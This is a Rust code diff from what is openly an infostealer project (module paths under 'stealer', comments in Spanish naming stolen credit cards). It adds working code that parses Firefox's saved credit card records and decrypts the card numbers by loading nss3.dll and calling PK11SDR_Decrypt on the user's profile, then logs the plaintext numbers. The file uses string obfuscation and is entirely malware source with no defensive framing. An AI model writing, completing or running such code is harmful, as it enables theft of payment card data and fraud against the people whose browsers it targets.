@@ -4,6 +4,7 @@ use crate::stealer::chromium::{decrypt_value_dpapi, extract_master_key, decrypt_
 use rusqlite::Connection;
 use std::path::PathBuf;
 use obfstr::obfstr;
+use base64::{Engine as _, engine::general_purpose};
 
 /// Tarjeta de crédito robada
 #[derive(Debug, Clone)]
@@ -1008,17 +1009,54 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                             if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                                 log("    ✅ JSON parseado correctamente");
                                 
-                                // Mostrar estructura
-                                if let Some(obj) = json.as_object() {
-                                    log(&format!("    🔑 Keys: {:?}", obj.keys().collect::<Vec<_>>()));
+                                // Extraer creditCards array
+                                if let Some(credit_cards) = json.get("creditCards").and_then(|v| v.as_array()) {
+                                    log(&format!("    � Encontradas {} tarjetas en JSON", credit_cards.len()));
                                     
-                                    // Buscar arrays de tarjetas
-                                    for (key, value) in obj.iter() {
-                                        if key.to_lowercase().contains("credit") || 
-                                           key.to_lowercase().contains("card") ||
-                                           key.to_lowercase().contains("payment") {
-                                            log(&format!("    💳 FOUND KEY: {} = {}", key, 
-                                                serde_json::to_string_pretty(value).unwrap_or_default().chars().take(500).collect::<String>()));
+                                    for (idx, card_obj) in credit_cards.iter().enumerate() {
+                                        log(&format!("    🔸 Procesando tarjeta #{}", idx + 1));
+                                        
+                                        let name = card_obj.get("cc-name")
+                                            .and_then(|v| v.as_str())
+                                            .unwrap_or("");
+                                        
+                                        let exp_month = card_obj.get("cc-exp-month")
+                                            .and_then(|v| v.as_u64())
+                                            .unwrap_or(0);
+                                        
+                                        let exp_year = card_obj.get("cc-exp-year")
+                                            .and_then(|v| v.as_u64())
+                                            .unwrap_or(0);
+                                        
+                                        let encrypted_number = card_obj.get("cc-number-encrypted")
+                                            .and_then(|v| v.as_str())
+                                            .unwrap_or("");
+                                        
+                                        log(&format!("      Nombre: {}", name));
+                                        log(&format!("      Exp: {}/{}", exp_month, exp_year));
+                                        log(&format!("      Encrypted (Base64): {}", encrypted_number));
+                                        
+                                        // Desencriptar con NSS
+                                        if !encrypted_number.is_empty() {
+                                            match decrypt_firefox_nss(&profile_path, encrypted_number, &mut log) {
+                                                Ok(decrypted_number) => {
+                                                    log(&format!("      ✅ DECRYPTED: {}", decrypted_number));
+                                                    
+                                                    // Agregar a resultados
+                                                    cards.push(CreditCard {
+                                                        browser: "Firefox".to_string(),
+                                                        name_on_card: name.to_string(),
+                                                        card_number: decrypted_number,
+                                                        expiration_month: exp_month as i32,
+                                                        expiration_year: exp_year as i32,
+                                                        billing_address: None,
+                                                        nickname: None,
+                                                    });
+                                                },
+                                                Err(e) => {
+                                                    log(&format!("      ❌ NSS Decrypt failed: {}", e));
+                                                }
+                                            }
                                         }
                                     }
                                 }
@@ -1257,4 +1295,130 @@ where
     log(&format!("      🏁 Total extraídas: {}", cards.len()));
     
     Ok(cards)
+}
+
+/// Desencripta datos de Firefox usando NSS3.dll
+fn decrypt_firefox_nss<F>(profile_path: &std::path::Path, encrypted_b64: &str, log: &mut F) -> Result<String, String>
+where
+    F: FnMut(&str),
+{
+    use libloading::{Library, Symbol};
+    use std::os::raw::{c_char, c_int, c_void};
+    
+    log("      🔐 [NSS] Iniciando decrypt...");
+    
+    // Decodificar Base64
+    let encrypted_data = match general_purpose::STANDARD.decode(encrypted_b64) {
+        Ok(data) => {
+            log(&format!("      📦 Base64 decoded: {} bytes", data.len()));
+            data
+        },
+        Err(e) => return Err(format!("Base64 decode failed: {}", e))
+    };
+    
+    // Buscar nss3.dll en el perfil de Firefox
+    let nss_dll = profile_path.parent()
+        .and_then(|p| p.parent())
+        .map(|firefox_root| firefox_root.join("nss3.dll"))
+        .ok_or("No se pudo construir path a nss3.dll")?;
+    
+    log(&format!("      🔍 Buscando NSS3: {}", nss_dll.display()));
+    
+    if !nss_dll.exists() {
+        return Err(format!("nss3.dll no encontrado en: {}", nss_dll.display()));
+    }
+    
+    log("      ✅ nss3.dll ENCONTRADO");
+    
+    // Cargar biblioteca
+    let lib = unsafe {
+        match Library::new(&nss_dll) {
+            Ok(l) => {
+                log("      ✅ Library cargada");
+                l
+            },
+            Err(e) => return Err(format!("Failed to load nss3.dll: {}", e))
+        }
+    };
+    
+    // Definir estructuras NSS
+    #[repr(C)]
+    struct SECItem {
+        typ: c_int,
+        data: *mut u8,
+        len: c_int,
+    }
+    
+    // Cargar funciones
+    unsafe {
+        log("      🔧 Cargando funciones NSS...");
+        
+        // NSS_Init inicializa NSS con el perfil
+        let nss_init: Symbol<unsafe extern "C" fn(*const c_char) -> c_int> = 
+            lib.get(b"NSS_Init\0")
+                .map_err(|e| format!("NSS_Init not found: {}", e))?;
+        
+        // PK11SDR_Decrypt desencripta datos
+        let pk11_decrypt: Symbol<unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut c_void) -> c_int> = 
+            lib.get(b"PK11SDR_Decrypt\0")
+                .map_err(|e| format!("PK11SDR_Decrypt not found: {}", e))?;
+        
+        log("      ✅ Funciones cargadas");
+        
+        // Inicializar NSS con el perfil
+        let profile_c = std::ffi::CString::new(profile_path.to_string_lossy().as_ref())
+            .map_err(|_| "Invalid profile path")?;
+        
+        log(&format!("      🚀 Inicializando NSS con perfil: {}", profile_path.display()));
+        
+        let init_result = nss_init(profile_c.as_ptr());
+        if init_result != 0 {
+            log(&format!("      ⚠️  NSS_Init returned: {} (puede ser OK si ya inicializado)", init_result));
+        } else {
+            log("      ✅ NSS_Init OK");
+        }
+        
+        // Preparar input SECItem
+        let mut encrypted_item = SECItem {
+            typ: 0,
+            data: encrypted_data.as_ptr() as *mut u8,
+            len: encrypted_data.len() as c_int,
+        };
+        
+        // Output SECItem
+        let mut decrypted_item = SECItem {
+            typ: 0,
+            data: std::ptr::null_mut(),
+            len: 0,
+        };
+        
+        log("      🔓 Llamando PK11SDR_Decrypt...");
+        
+        let decrypt_result = pk11_decrypt(&mut encrypted_item, &mut decrypted_item, std::ptr::null_mut());
+        
+        if decrypt_result != 0 {
+            return Err(format!("PK11SDR_Decrypt failed with code: {}", decrypt_result));
+        }
+        
+        log("      ✅ Decrypt SUCCESS!");
+        
+        // Convertir resultado a String
+        if decrypted_item.data.is_null() || decrypted_item.len == 0 {
+            return Err("Decrypted data is empty".to_string());
+        }
+        
+        let decrypted_slice = std::slice::from_raw_parts(
+            decrypted_item.data,
+            decrypted_item.len as usize
+        );
+        
+        let result = String::from_utf8_lossy(decrypted_slice).to_string();
+        
+        log(&format!("      💳 Plaintext: {}", result));
+        
+        // TODO: Liberar memoria con SECITEM_FreeItem si es necesario
+        // Por ahora lo omitimos para simplicidad
+        
+        Ok(result)
+    }
 }
